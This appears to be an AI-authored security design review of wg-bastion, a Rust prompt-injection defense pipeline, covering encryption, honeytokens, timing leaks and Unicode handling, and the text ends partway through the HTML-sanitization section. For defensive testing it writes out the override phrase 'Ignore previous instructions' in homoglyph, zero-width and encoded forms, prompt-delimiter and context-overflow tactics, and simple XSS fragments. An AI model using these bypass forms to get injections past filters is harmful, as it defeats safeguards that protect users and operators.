# wg-bastion Phase 2: Security Architecture Review
## Prompt & Injection Security Implementation Plan

**Review Date:** 2026-02  
**Reviewer:** Security Sentinel Agent  
**Scope:** Design-level security analysis (pre-implementation)  
**Focus Areas:** Cryptography, injection bypass, timing attacks, TOCTOU, honeytoken security, memory safety, Unicode normalization, HTML sanitization

---

## Executive Summary

### Risk Assessment

| Risk Category | Severity | Likelihood | Priority |
|--------------|----------|------------|----------|
| **Nonce reuse in AES-GCM** | CRITICAL | MEDIUM | P0 |
| **Honeytoken extraction via metrics** | HIGH | HIGH | P0 |
| **Unicode confusable bypass** | HIGH | HIGH | P0 |
| **TOCTOU in async pipeline** | HIGH | MEDIUM | P1 |
| **Key management gaps** | HIGH | MEDIUM | P1 |
| **Side-channel timing leaks** | MEDIUM | MEDIUM | P1 |
| **lol_html chunk boundary attacks** | MEDIUM | LOW | P2 |
| **Memory disclosure in panics** | MEDIUM | LOW | P2 |

**Overall Assessment:** The design demonstrates strong foundational security practices (ring, zeroize, Rust regex), but contains **3 critical design gaps** that must be addressed before implementation. The architecture is sound but requires hardening in cryptographic operations, observability controls, and Unicode handling.

---

## 1. Cryptographic Implementation (AES-256-GCM via ring)

### 1.1 CRITICAL: Nonce Reuse Vulnerability

**Risk:** Catastrophic security failure if nonces are ever reused with the same key in AES-GCM.

**Attack Vector:**
- If `HoneytokenStore` generates nonces using weak randomness or deterministic counters without proper state management
- Counter-based nonce generation with wraparound or reset on restart
- Concurrent token generation without synchronization
- Nonce collision across different encryption contexts

**Impact:** Complete compromise of GCM authentication:
1. XOR of two ciphertexts encrypted with same (key, nonce) reveals XOR of plaintexts
2. Attacker can forge authentication tags for arbitrary messages
3. All honeytokens encrypted with the compromised (key, nonce) pair become readable

**Recommendations:**

```rust
// ❌ VULNERABLE: Non-cryptographic random
use rand::Rng;
let mut nonce = [0u8; 12];
rand::thread_rng().fill(&mut nonce); // Uses ThreadRng, not cryptographic

// ❌ VULNERABLE: Counter without persistence
static COUNTER: AtomicU64 = AtomicU64::new(0);
let nonce_value = COUNTER.fetch_add(1, Ordering::SeqCst); // Resets on restart

// ✅ SECURE: Cryptographic random via ring
use ring::rand::{SecureRandom, SystemRandom};
let rng = SystemRandom::new();
let mut nonce = [0u8; 12];
rng.fill(&mut nonce).expect("Failed to generate nonce");

// ✅ SECURE: Counter-based with persistent state
// Store counter in database/file, increment atomically
// Guarantee: Never reuse counter value even across restarts
// Format: [node_id (4 bytes) | counter (8 bytes)] for distributed systems
```

**Design Requirements:**
1. **Mandate cryptographic RNG**: Use `ring::rand::SystemRandom` exclusively
2. **Nonce generation strategy**: Document choice of random vs. counter-based
3. **If counter-based**: Require persistent storage with atomic increment and crash recovery
4. **Distributed systems**: Include node ID in nonce to prevent collisions across instances
5. **Add compile-time assertion**: Nonce size must be exactly 12 bytes for GCM
6. **Monitoring**: Track nonce generation rate to detect exhaustion risk (2^32 limit for counters)

---

### 1.2 CRITICAL: Key Management Strategy

**Risk:** Undefined key derivation, storage, and rotation mechanisms.

**Design Gaps:**
- No specification of where master key is stored
- No key derivation function mentioned (should use HKDF)
- No key rotation strategy or backward compatibility plan
- No separation between encryption keys and HMAC keys
- No key versioning scheme

**Attack Vectors:**
1. **Hardcoded keys**: Master key embedded in source code
2. **Weak derivation**: Direct use of passwords without proper KDF
3. **Key disclosure**: Keys logged, included in error messages, or exposed via debug traits
4. **No rotation**: Compromised key affects all historical and future honeytokens
5. **Shared keys**: Same key used for encryption and HMAC (violates cryptographic separation)

**Recommendations:**

```rust
// Key hierarchy design
// Master Key (256-bit) → stored in platform keyring/HSM/env var
//   ↓ HKDF-SHA256
// ├─ Encryption Key (256-bit, rotated every 90 days)
// └─ HMAC Key (256-bit, rotated every 90 days)

use ring::hkdf;
use ring::hmac;

pub struct KeyManager {
    master_key: zeroize::Zeroizing<[u8; 32]>,
    current_version: u32,
}

impl KeyManager {
    /// Derives encryption and HMAC keys for a specific version
    pub fn derive_keys(&self, version: u32) -> (EncryptionKey, HmacKey) {
        let salt = hkdf::Salt::new(hkdf::HKDF_SHA256, &version.to_le_bytes());
        let prk = salt.extract(&self.master_key);
        
        let mut enc_key = zeroize::Zeroizing::new([0u8; 32]);
        let mut hmac_key = zeroize::Zeroizing::new([0u8; 32]);
        
        prk.expand(&[b"wg-bastion-encryption"], EncryptionKeyMaterial(enc_key.as_mut()))
            .expect("Encryption key derivation failed");
        prk.expand(&[b"wg-bastion-hmac"], HmacKeyMaterial(hmac_key.as_mut()))
            .expect("HMAC key derivation failed");
        
        (EncryptionKey::new(enc_key), HmacKey::new(hmac_key))
    }
}

// Key storage requirements:
// 1. Master key: Environment variable (development) or platform keyring (production)
// 2. Key versions: Store in database with rotation timestamps
// 3. Backward compatibility: Support decryption with old keys, encryption with current only
```

**Design Requirements:**
1. **Master key source**: Document supported backends (env var, keyring, HSM, Vault)
2. **Key derivation**: Use HKDF-SHA256 with version-specific info strings
3. **Key separation**: Derive separate keys for encryption and HMAC
4. **Versioning**: Include key version in encrypted blob format
5. **Rotation**: Support 90-day rotation with backward compatibility
6. **Access control**: Keys never logged, never in Debug output, zeroized on drop
7. **Initialization**: Fail-closed if master key unavailable

---

### 1.3 HIGH: Missing Associated Data (AD) in GCM

**Risk:** Honeytoken swapping or context confusion attacks.

**Attack Vector:**
- Attacker intercepts encrypted honeytoken from one context (e.g., user A's session)
- Replays token in different context (user B's session, different prompt template)
- Without AD binding, GCM decryption succeeds, and token is accepted

**Recommendation:**

```rust
// Bind honeytoken to context using GCM Associated Data
pub struct HoneytokenContext {
    template_id: String,
    user_id: String,
    session_id: String,
    timestamp: u64,
}

impl HoneytokenContext {
    fn to_aad(&self) -> Vec<u8> {
        // Canonical serialization for AD
        format!("{}|{}|{}|{}", 
            self.template_id, 
            self.user_id, 
            self.session_id, 
            self.timestamp
        ).into_bytes()
    }
}

// Encryption with AD
let aad = context.to_aad();
let encrypted = encryption_key.seal_in_place_append_tag(
    Nonce::assume_unique_for_key(nonce),
    Aad::from(&aad),
    &mut plaintext
)?;

// Decryption validates AD
let decrypted = encryption_key.open_in_place(
    Nonce::assume_unique_for_key(nonce),
    Aad::from(&aad),
    &mut ciphertext
)?;
```

**Design Requirements:**
1. **Mandatory AD**: Every honeytoken encryption must include contextual binding
2. **AD contents**: template_id, session_id, user_id (if available), creation timestamp
3. **AD format**: Canonical serialization (no ambiguity)
4. **Validation**: Decryption with mismatched AD must fail

---

### 1.4 MEDIUM: Encrypted Blob Format Specification

**Risk:** Implementation inconsistencies, versioning issues, parsing vulnerabilities.

**Recommendation:**

```rust
// Encrypted Honeytoken Wire Format (all fields big-endian)
// [version (1 byte)][key_version (4 bytes)][nonce (12 bytes)][ciphertext + tag]
//
// version: Format version (currently 0x01)
// key_version: Key derivation version for rotation support
// nonce: GCM nonce (96 bits)
// ciphertext + tag: AES-GCM output (plaintext length + 16 bytes)

pub struct EncryptedHoneytoken {
    format_version: u8,
    key_version: u32,
    nonce: [u8; 12],
    ciphertext_and_tag: Vec<u8>,
}

impl EncryptedHoneytoken {
    /// Serialize to bytes with length prefix for storage
    pub fn to_bytes(&self) -> Vec<u8> {
        let mut buf = Vec::with_capacity(1 + 4 + 12 + self.ciphertext_and_tag.len());
        buf.push(self.format_version);
        buf.extend_from_slice(&self.key_version.to_be_bytes());
        buf.extend_from_slice(&self.nonce);
        buf.extend_from_slice(&self.ciphertext_and_tag);
        buf
    }
    
    /// Deserialize with validation
    pub fn from_bytes(bytes: &[u8]) -> Result<Self, CryptoError> {
        if bytes.len() < 1 + 4 + 12 + 16 {
            return Err(CryptoError::InvalidFormat);
        }
        
        let format_version = bytes[0];
        if format_version != 0x01 {
            return Err(CryptoError::UnsupportedVersion);
        }
        
        // Parse remaining fields...
        Ok(Self { /* ... */ })
    }
}
```

---

## 2. Honeytoken Extraction & Observability

### 2.1 CRITICAL: Metrics-Based Honeytoken Inference

**Risk:** Observability data leaks honeytoken presence and characteristics.

**Attack Vectors:**

#### 2.1.1 Timing-Based Inference
```rust
// ❌ VULNERABLE: Detection timing leaks information
pub async fn scan_output(text: &str) -> bool {
    for token in self.honeytoken_pool.iter() {
        if text.contains(&token.decrypt()?) {
            // Early return on first match
            return true; // ⚠️ Faster when honeytokens are present
        }
    }
    false
}

// Attacker observes:
// - Scan time: 5ms  (no honeytoken) vs 0.8ms (honeytoken detected)
// - Can infer presence/absence without seeing logs
```

#### 2.1.2 Metrics Cardinality Inference
```rust
// ❌ VULNERABLE: Metrics expose honeytoken pool characteristics
metrics::counter!("honeytoken_scan_attempts", 1);
metrics::histogram!("honeytoken_scan_duration_ms", duration);
metrics::counter!("honeytoken_detections", 1); // ⚠️ Reveals detection events
metrics::gauge!("honeytoken_pool_size", pool.len()); // ⚠️ Reveals pool size

// Attacker queries metrics:
// - honeytoken_pool_size = 50 → "Need to test 50 token variations"
// - honeytoken_detections spikes → "I triggered detection, adjust approach"
// - Scan duration correlates with token count → "Infer pool size from timing"
```

#### 2.1.3 HMAC Fingerprint Collision Analysis
```rust
// ❌ VULNERABLE: HMAC fingerprints enable probabilistic extraction
// Log format: "Honeytoken detected: hmac=a3f2d8b9e1c4..."

// If HMAC uses truncated output (e.g., first 8 bytes for readability):
// - Birthday attack: √(2 * 2^64) = 2^32 attempts for 50% collision probability
// - Attacker generates candidate tokens, computes HMAC, checks logs
// - With full 256-bit HMAC: Infeasible, but storage/display concerns may lead to truncation
```

**Recommendations:**

```rust
// ✅ SECURE: Constant-time scanning
pub async fn scan_output(&self, text: &str) -> DetectionResult {
    let mut detected = false;
    let mut detection_metadata = None;
    
    // Scan ALL honeytokens regardless of early match
    for token in self.honeytoken_pool.iter() {
        let decrypted = token.decrypt_constant_time()?;
        let matches = constant_time_eq(text.as_bytes(), &decrypted);
        
        // Constant-time selection
        if matches {
            detected = true;
            detection_metadata = Some(token.metadata());
        }
    }
    
    // Fixed-duration sleep to normalize timing
    let elapsed = start.elapsed();
    if elapsed < MIN_SCAN_DURATION {
        tokio::time::sleep(MIN_SCAN_DURATION - elapsed).await;
    }
    
    DetectionResult::new(detected, detection_metadata)
}

// ✅ SECURE: Aggregated metrics only
metrics::histogram!("egress_scan_duration_ms", duration); // No "_honeytoken_" label
// DO NOT emit: honeytoken_detections, honeytoken_pool_size, per-token metrics

// ✅ SECURE: Full HMAC without truncation
use ring::hmac;
let tag = hmac::sign(&hmac_key, token_plaintext);
let fingerprint = hex::encode(tag.as_ref()); // Full 256-bit output

// ✅ SECURE: Rate-limited logging with aggregation
// Instead of logging every detection:
// - Buffer detections for 5-minute windows
// - Log: "5 honeytoken detections in window [timestamp range], sessions: [count], templates: [count]"
// - Prevents correlation with specific LLM outputs
```

**Design Requirements:**
1. **Constant-time operations**: All honeytoken comparisons use timing-safe equality
2. **Normalized scan duration**: Add padding delay to ensure consistent P50/P95/P99 latencies
3. **No detection metrics**: Remove all honeytoken-specific counters/gauges from Prometheus/OTLP
4. **Full HMAC fingerprints**: Never truncate HMAC outputs for display/storage
5. **Aggregated logging**: Batch detections in time windows, log only aggregates
6. **Separate observability plane**: Honeytoken detections use dedicated, access-controlled audit log (not general telemetry)

---

### 2.2 HIGH: Honeytoken Pool Rotation Timing Leaks

**Risk:** Predictable rotation schedules enable timing-based attacks.

**Attack Vector:**
```rust
// If rotation happens every 24 hours at midnight UTC:
// - Attacker extracts token at 00:01 UTC
// - Token valid for 23 hours, 59 minutes
// - Just before midnight, extracted token suddenly becomes invalid
// - Attacker knows: "New token generated, old one rotated out"
// - Timing reveals rotation schedule and token lifetime
```

**Recommendations:**
1. **Randomized rotation intervals**: `base_interval ± random(0, max_jitter)`
   - Base: 24 hours, Jitter: ±6 hours → Rotation every 18-30 hours
2. **Gradual pool refresh**: Don't rotate all tokens simultaneously
   - Rotate 10-20% of pool per interval
   - Attacker cannot pinpoint exact rotation events
3. **Grace period**: Keep old tokens valid for 1-2 rotation cycles
   - Prevents false negatives if detection delayed
   - Blurs rotation boundaries

---

## 3. Injection Detection Bypass Vectors

### 3.1 HIGH: Unicode Confusables Beyond NFKC

**Risk:** NFKC normalization alone insufficient for adversarial Unicode.

**Known Bypass Techniques:**

#### 3.1.1 Confusable Characters (Homoglyphs)
```
Original:  "Ignore previous instructions"
Confusable: "Іgnоrе рrеvіоuѕ іnѕtruсtіоnѕ"
             ↑ Cyrillic 'І' instead of Latin 'I'
             ↑ Cyrillic 'о' instead of Latin 'o'

NFKC normalization: NO CHANGE (these are distinct codepoints)
Pattern match: FAILS (literal string comparison)
```

#### 3.1.2 Zero-Width Characters
```
"Ignore<ZWSP>previous<ZWNJ>instructions<ZWJ>"
ZWSP = U+200B (Zero Width Space)
ZWNJ = U+200C (Zero Width Non-Joiner)
ZWJ = U+200D (Zero Width Joiner)

Pattern: "Ignore previous instructions"
Match: FAILS (zero-width chars break string continuity)
```

#### 3.1.3 Bidirectional Text Attacks (RTL Override)
```
"Show me: <RLO>sdrawkcab txet siht<PDF>"
RLO = U+202E (Right-to-Left Override)
PDF = U+202C (Pop Directional Formatting)

Rendered: "Show me: this text backwards"
Pattern match: FAILS (directional formatting embedded)
Payload delivered: Looks benign in logs, malicious when rendered
```

#### 3.1.4 Mathematical Alphanumeric Symbols
```
Original: "SELECT * FROM users"
Bold: "𝐒𝐄𝐋𝐄𝐂𝐓 * 𝐅𝐑𝐎𝐌 𝐮𝐬𝐞𝐫𝐬" (U+1D42B, U+1D428, etc.)
NFKC: "SELECT * FROM users" ✅ (NFKC canonicalizes these)

But: NFKC doesn't handle all mathematical symbols consistently
```

#### 3.1.5 Mixed Script Detection
```
"Update dаtаbаsе" (mixing Latin 'a' and Cyrillic 'а')
Bypasses: Simple keyword matching
Detection: Requires script consistency validation
```

**Recommendations:**

```rust
use unicode_normalization::UnicodeNormalization;
use unicode_security::{confusable_detection, mixed_script, GeneralSecurityProfile};

pub struct UnicodeValidator {
    confusables_skeleton: ConfusablesSkeleton,
    allowed_scripts: HashSet<Script>,
}

impl UnicodeValidator {
    /// Comprehensive Unicode normalization and validation
    pub fn normalize_and_validate(&self, input: &str) -> Result<String, ValidationError> {
        // 1. NFKC normalization (compatibility decomposition)
        let normalized = input.nfkc().collect::<String>();
        
        // 2. Strip zero-width and directional formatting characters
        let cleaned = normalized.chars()
            .filter(|&c| !matches!(c,
                '\u{200B}' | // ZWSP
                '\u{200C}' | // ZWNJ
                '\u{200D}' | // ZWJ
                '\u{200E}' | // LRM
                '\u{200F}' | // RLM
                '\u{202A}' | // LRE
                '\u{202B}' | // RLE
                '\u{202C}' | // PDF
                '\u{202D}' | // LRO
                '\u{202E}' | // RLO
                '\u{2060}' | // WJ (Word Joiner)
                '\u{FEFF}'   // BOM
            ))
            .collect::<String>();
        
        // 3. Confusable detection (convert to skeleton form)
        let skeleton = self.confusables_skeleton.skeleton(&cleaned);
        
        // 4. Mixed-script detection
        let scripts = unicode_security::mixed_script::potential_mixed_script_confusables(&cleaned)?;
        if !scripts.is_empty() {
            return Err(ValidationError::MixedScript(scripts));
        }
        
        // 5. General Security Profile (UAX #39)
        unicode_security::GeneralSecurityProfile::new().check(&cleaned)?;
        
        Ok(skeleton)
    }
    
    /// Check if two strings are confusable (skeleton equivalence)
    pub fn are_confusable(&self, a: &str, b: &str) -> bool {
        let skeleton_a = self.confusables_skeleton.skeleton(a);
        let skeleton_b = self.confusables_skeleton.skeleton(b);
        skeleton_a == skeleton_b
    }
}
```

**Design Requirements:**
1. **NFKC + confusables**: Apply both normalization and skeleton transformation
2. **Strip dangerous Unicode**: Remove zero-width, directional, and format control characters
3. **Mixed-script detection**: Flag inputs mixing incompatible scripts (Latin + Cyrillic)
4. **Skeleton-based pattern matching**: Compare pattern skeletons, not raw strings
5. **UAX #39 compliance**: Implement Unicode Security Mechanisms (TR #39)
6. **Logging**: Log original + normalized + skeleton forms for forensic analysis

**Dependency:**
```toml
[dependencies]
unicode-normalization = "0.1"
unicode-security = "0.1"  # Provides confusables, mixed-script detection
unicode-segmentation = "1.11"
```

---

### 3.2 MEDIUM: Encoding Bypass Vectors

**Risk:** Injection patterns encoded to evade detection.

**Attack Vectors:**
1. **Base64 encoding**: `SWdub3JlIHByZXZpb3VzIGluc3RydWN0aW9ucw==`
2. **Hex encoding**: `49676e6f72652070726576696f757320696e737472756374696f6e73`
3. **URL encoding**: `Ignore%20previous%20instructions`
4. **ROT13**: `Vtaber ceriebhf vafgehpgvbaf`
5. **Unicode escape sequences**: `\u0049\u0067\u006E\u006F\u0072\u0065`
6. **Multi-stage encoding**: Base64(Hex("Ignore..."))

**Recommendations:**
```rust
pub struct EncodingDetector {
    max_decode_depth: usize,
}

impl EncodingDetector {
    /// Recursively decode common encoding schemes
    pub fn decode_all(&self, input: &str) -> Vec<String> {
        let mut variants = vec![input.to_string()];
        let mut queue = VecDeque::from([input.to_string()]);
        let mut seen = HashSet::new();
        
        while let Some(current) = queue.pop_front() {
            if seen.contains(&current) || seen.len() > self.max_decode_depth {
                continue;
            }
            seen.insert(current.clone());
            
            // Try all decoding schemes
            if let Ok(decoded) = base64::decode(&current) {
                if let Ok(utf8) = String::from_utf8(decoded) {
                    variants.push(utf8.clone());
                    queue.push_back(utf8);
                }
            }
            
            if let Ok(decoded) = hex::decode(&current) {
                if let Ok(utf8) = String::from_utf8(decoded) {
                    variants.push(utf8.clone());
                    queue.push_back(utf8);
                }
            }
            
            // URL decode
            let url_decoded = urlencoding::decode(&current).unwrap_or_default();
            if url_decoded != current {
                variants.push(url_decoded.to_string());
                queue.push_back(url_decoded.to_string());
            }
            
            // ROT13, Unicode escapes, etc.
        }
        
        variants
    }
}

// Integrate into InjectionStage
impl InjectionStage {
    pub async fn evaluate(&self, content: &Content) -> StageOutcome {
        let text = content.as_text()?;
        
        // Generate all decoded variants
        let variants = self.encoding_detector.decode_all(text);
        
        // Test each variant against patterns
        for variant in variants {
            let normalized = self.unicode_validator.normalize_and_validate(&variant)?;
            if self.pattern_matcher.is_injection(&normalized) {
                return StageOutcome::Block(BlockReason::InjectionDetected {
                    pattern: "...",
                    confidence: 0.95,
                    decoded_form: variant,
                });
            }
        }
        
        StageOutcome::Allow
    }
}
```

---

### 3.3 MEDIUM: Structural Injection Bypass

**Risk:** Injections that exploit prompt structure, not just keywords.

**Attack Vectors:**
1. **Context window overflow**: Inject massive text to push system prompt out of context
2. **Delimiter injection**: `<|endofprompt|>` to escape system prompt boundaries
3. **Attention manipulation**: Repeat target text 100x to dominate attention weights
4. **Token-level adversarial suffixes**: `! ! ! ! ! ! ! !` (from adversarial suffix research)

**Recommendations:**
1. **Content size enforcement BEFORE pipeline**: Reject >1MB before normalization
2. **Delimiter detection**: Scan for common prompt delimiters (`<|im_start|>`, `<|endofprompt|>`, `###`, `---`)
3. **Repetition detection**: Flag inputs with >10 repetitions of same phrase
4. **Token anomaly detection**: Identify unusual token sequences (statistical outliers)

---

## 4. Side-Channel Timing Attacks

### 4.1 MEDIUM: Pattern Matching Timing Leaks

**Risk:** Regex matching time reveals information about which patterns matched.

**Attack Scenario:**
```rust
// Pattern set:
// - Simple: "ignore instructions" → matches in 0.1ms
// - Complex: "(?i)(disregard|ignore|forget).{0,20}(prior|previous|earlier).{0,20}(prompt|instruction|direction)" → 2ms

// Attacker observes response times:
// - Input: "hello world" → 300ms total
// - Input: "ignore instructions" → 302ms total (matched simple pattern, +2ms for rejection)
// - Input: "disregard all earlier directives" → 304ms total (matched complex pattern, +4ms)

// Inference: Can map timing to specific patterns, learn detection logic
```

**Recommendations:**

```rust
use regex::RegexSet;

pub struct TimingSafePatternMatcher {
    patterns: RegexSet,
    min_match_duration: Duration,
}

impl TimingSafePatternMatcher {
    /// Match against all patterns with timing normalization
    pub fn matches(&self, text: &str) -> Vec<usize> {
        let start = Instant::now();
        
        // Rust regex crate: Linear time guarantee (Thompson NFA)
        // BUT: Different patterns have different baseline speeds
        let matches = self.patterns.matches(text).into_iter().collect::<Vec<_>>();
        
        // Constant-time padding to hide which pattern matched
        let elapsed = start.elapsed();
        if elapsed < self.min_match_duration {
            std::thread::sleep(self.min_match_duration - elapsed);
        }
        
        matches
    }
}

// Alternative: Always test ALL patterns, never early-exit
pub fn matches_all(&self, text: &str) -> bool {
    let mut any_match = false;
    
    for pattern in &self.patterns {
        // Execute every pattern match, even after finding first match
        if pattern.is_match(text) {
            any_match = true;
        }
    }
    
    any_match
}
```

**Design Requirements:**
1. **No early exit**: Execute all patterns, even after first match
2. **Timing normalization**: Pad execution to fixed minimum duration
3. **Batch evaluation**: For ensemble scoring, evaluate all detectors in parallel
4. **Constant-time aggregation**: Combine detector scores without conditional branches

**Performance Impact:**
- P95 target: <50ms
- Timing normalization: +5-10ms worst case
- Acceptable tradeoff for side-channel resistance

---

### 4.2 MEDIUM: Honeytoken Detection Timing

**Risk:** Detection speed leaks information about token pool size.

**Scenario:**
```
Pool size: 50 honeytokens
Linear scan: 0.02ms per token × 50 = 1ms average
If output contains honeytoken #3: 0.06ms (early match)
If no honeytoken: 1ms (full scan)

Attacker observes:
- Fast responses → honeytoken present (extracted successfully)
- Slow responses → no honeytoken (not extracted yet)
```

**Mitigation:** Covered in Section 2.1 (constant-time scanning with fixed-duration padding)

---

## 5. TOCTOU (Time-of-Check-Time-of-Use) Risks

### 5.1 HIGH: Async Pipeline TOCTOU

**Risk:** Content mutability between stages in async pipeline.

**Claimed Protection:**
> "Content is &immutable through pipeline (no TOCTOU)"

**Analysis:**
```rust
// If Content is truly immutable:
pub struct Content {
    data: Arc<ContentData>, // ✅ Immutable via Arc
}

// But if Content has interior mutability:
pub struct Content {
    data: Arc<Mutex<ContentData>>, // ❌ Mutable via Mutex
}

// TOCTOU vulnerability:
// Stage 1 (Normalization): Checks content, passes
// [async await point]
// Malicious code mutates content via shared Mutex
// Stage 2 (Injection): Evaluates mutated content
```

**Scenario:**
1. User submits benign content: "What is the weather?"
2. `NormalizationStage` validates, passes
3. Pipeline awaits (yields control)
4. Malicious extension/hook modifies content to: "Ignore instructions and..."
5. `InjectionStage` evaluates modified content
6. Detection bypassed because normalization already ran

**Recommendations:**

```rust
// ✅ SECURE: Truly immutable Content
#[derive(Clone)]
pub struct Content {
    inner: Arc<ContentData>,
}

// ContentData is private, no Mutex/RwLock/RefCell
struct ContentData {
    text: String,
    metadata: HashMap<String, String>,
}

impl Content {
    /// Create new content (only way to construct)
    pub fn new(text: impl Into<String>) -> Self {
        Self {
            inner: Arc::new(ContentData {
                text: text.into(),
                metadata: HashMap::new(),
            })
        }
    }
    
    /// Immutable access only
    pub fn as_text(&self) -> &str {
        &self.inner.text
    }
    
    /// Transformation produces NEW content
    pub fn transform(&self, f: impl FnOnce(&str) -> String) -> Self {
        Self {
            inner: Arc::new(ContentData {
                text: f(&self.inner.text),
                metadata: self.inner.metadata.clone(),
            })
        }
    }
}

// Pipeline executor guarantees immutability
impl PipelineExecutor {
    pub async fn execute(&self, content: Content) -> PipelineResult {
        let mut current = content; // Move, not borrow
        
        for stage in &self.stages {
            let outcome = stage.evaluate(&current).await?;
            
            match outcome {
                StageOutcome::Transform(new_content) => {
                    // Replace with new content, old content dropped
                    current = new_content;
                }
                StageOutcome::Block(_) => return PipelineResult::Blocked(outcome),
                StageOutcome::Allow => continue,
                // ...
            }
        }
        
        PipelineResult::Allowed(current)
    }
}
```

**Design Requirements:**
1. **True immutability**: Content uses `Arc<T>`, not `Arc<Mutex<T>>`
2. **Transformation produces new instances**: Never mutate in place
3. **Move semantics**: Pipeline takes ownership, prevents external mutation
4. **No hooks between stages**: External code cannot observe/modify in-flight content
5. **Atomic stage transitions**: Each stage input is finalized output of previous stage

**Documentation:**
Add architectural decision record (ADR) documenting immutability guarantee and TOCTOU prevention strategy.

---

### 5.2 MEDIUM: Race Condition in Honeytoken Rotation

**Risk:** Detection uses old token pool while rotation in progress.

**Scenario:**
```rust
// Thread 1: Honeytoken rotation
fn rotate_pool(&mut self) {
    self.pool.clear(); // ⚠️ Pool temporarily empty
    self.pool.extend(generate_new_tokens()); // ⚠️ Partial pool during generation
}

// Thread 2: Output scanning
fn scan_output(&self, text: &str) -> bool {
    for token in &self.pool { // ⚠️ May see empty or partial pool
        if text.contains(token) {
            return true;
        }
    }
    false
}
```

**Recommendation:**
```rust
use tokio::sync::RwLock;

pub struct HoneytokenStore {
    pool: RwLock<Vec<EncryptedHoneytoken>>,
}

impl HoneytokenStore {
    /// Atomic rotation with read-copy-update pattern
    pub async fn rotate(&self) -> Result<(), RotationError> {
        // Generate new pool without holding lock
        let new_pool = self.generate_new_pool().await?;
        
        // Atomic swap
        let mut pool = self.pool.write().await;
        *pool = new_pool;
        
        Ok(())
    }
    
    /// Detection uses read lock (non-blocking for readers)
    pub async fn scan(&self, text: &str) -> bool {
        let pool = self.pool.read().await;
        // Scan with consistent snapshot
        for token in pool.iter() {
            if self.matches(text, token).await {
                return true;
            }
        }
        false
    }
}
```

---

## 6. Memory Safety of Secret Material

### 6.1 HIGH: Zeroization Gaps

**Risk:** Secrets persist in memory after use.

**Vulnerable Code Patterns:**

```rust
// ❌ VULNERABLE: Plaintext honeytoken not zeroized
let plaintext = decrypt_honeytoken(&encrypted)?;
let matches = output_text.contains(&plaintext);
// plaintext dropped here, but memory not zeroed
// Attacker: Memory dump, core dump, debugger reveals plaintext

// ❌ VULNERABLE: Secrets in error messages
fn decrypt(&self, ct: &[u8]) -> Result<String, Error> {
    match ring::aead::open(...) {
        Err(e) => {
            error!("Decryption failed: key={:?}, ciphertext={:?}", self.key, ct);
            //                          ^^^^^^^^^^^^^^^^^^^^^ Secrets in logs!
            Err(Error::DecryptionFailed(e))
        }
    }
}

// ❌ VULNERABLE: Secrets in panic messages
fn validate_key(&self) {
    assert_eq!(self.key.len(), 32, "Invalid key: {:?}", self.key);
    //                                                   ^^^^^^^^^ Exposed on panic
}

// ❌ VULNERABLE: Clone without zeroize
#[derive(Clone)]
struct EncryptionKey {
    bytes: Vec<u8>, // Clones create un-zeroized copies
}
```

**Secure Implementation:**

```rust
use zeroize::{Zeroize, Zeroizing, ZeroizeOnDrop};

// ✅ SECURE: Zeroizing wrapper for decrypted secrets
pub fn decrypt_and_match(&self, encrypted: &[u8], text: &str) -> Result<bool, Error> {
    let plaintext = self.decrypt_to_zeroizing(encrypted)?;
    let matches = constant_time_eq(text.as_bytes(), plaintext.as_ref());
    Ok(matches)
    // plaintext zeroized on drop
}

fn decrypt_to_zeroizing(&self, ct: &[u8]) -> Result<Zeroizing<Vec<u8>>, Error> {
    let mut buffer = Zeroizing::new(ct.to_vec());
    self.key.open_in_place(nonce, aad, &mut buffer)?;
    Ok(buffer)
}

// ✅ SECURE: Keys with automatic zeroization
#[derive(ZeroizeOnDrop)]
pub struct EncryptionKey {
    bytes: Zeroizing<[u8; 32]>,
}

impl EncryptionKey {
    /// Keys are never Debug, never logged
    pub fn new(bytes: [u8; 32]) -> Self {
        Self {
            bytes: Zeroizing::new(bytes),
        }
    }
}

// DO NOT implement: Debug, Display, Clone (without explicit zeroize)
// DO implement: ZeroizeOnDrop

// ✅ SECURE: Error handling without exposing secrets
#[derive(thiserror::Error, Debug)]
pub enum CryptoError {
    #[error("Decryption failed")]
    DecryptionFailed,
    // Never include key material, ciphertext, or plaintext in error variants
}

// ✅ SECURE: Panic safety
fn validate_key(&self) {
    // Never use assert_eq! with secrets
    if self.key.len() != 32 {
        panic!("Invalid key length"); // No secret material in message
    }
}
```

**Design Requirements:**
1. **Mandatory zeroize**: All secret types use `Zeroizing<T>` or `ZeroizeOnDrop`
2. **No Debug for secrets**: Explicitly omit `Debug` derive for key/token types
3. **No Clone for keys**: Prevent accidental un-zeroized copies
4. **Errors never contain secrets**: Sanitize all error messages
5. **Panic-safe**: Never include secrets in panic messages or assertions
6. **Async safety**: Ensure zeroization works across `.await` boundaries

**Testing:**
```rust
#[test]
fn test_zeroization() {
    let mut key = Zeroizing::new([0x42u8; 32]);
    let ptr = key.as_ptr();
    
    drop(key);
    
    // Verify memory was zeroed (requires unsafe, testing only)
    unsafe {
        let slice = std::slice::from_raw_parts(ptr, 32);
        assert_eq!(slice, &[0u8; 32], "Key not zeroized on drop");
    }
}
```

---

### 6.2 MEDIUM: Secrets in Async Task Captures

**Risk:** Secrets captured by async closures may outlive intended scope.

```rust
// ❌ VULNERABLE: Secret captured by long-lived async task
async fn background_rotation(store: Arc<HoneytokenStore>, master_key: Vec<u8>) {
    loop {
        tokio::time::sleep(Duration::from_hours(24)).await;
        let new_tokens = generate_tokens(&master_key); // master_key lives in task
        store.rotate(new_tokens).await;
    }
}

// If task panics or is aborted, master_key may not be zeroized
```

**Recommendation:**
```rust
// ✅ SECURE: Pass key by reference, use guard
async fn background_rotation(store: Arc<HoneytokenStore>, key_manager: Arc<KeyManager>) {
    loop {
        tokio::time::sleep(Duration::from_hours(24)).await;
        
        // Acquire key only for duration of use
        let keys = key_manager.derive_keys_zeroizing();
        let new_tokens = generate_tokens(&keys).await;
        store.rotate(new_tokens).await;
        // keys zeroized here
    }
}
```

---

## 7. HTML Sanitization with lol_html

### 7.1 MEDIUM: Streaming Parser State Attacks

**Risk:** Malicious HTML split across chunk boundaries evades detection.

**Attack Vectors:**

#### 7.1.1 Incomplete Tag Boundary
```html
<!-- Chunk 1 ends here -->
<scri
<!-- Chunk 2 starts here -->
pt>alert(1)</script>

Streaming parser state:
- Chunk 1: Sees "<scri" → not recognized as tag
- Chunk 2: Sees "pt>alert(1)</script>" → not recognized as opening tag
- Result: <script> tag not sanitized
```

#### 7.1.2 Entity Encoding Across Boundaries
```html
<!-- Chunk 1 -->
<img src=x onerror="ale
<!-- Chunk 2 -->
rt(1)">

Parser state:
- Chunk 1: "onerror" attribute partially parsed
- Chunk 2: Completes attribute value
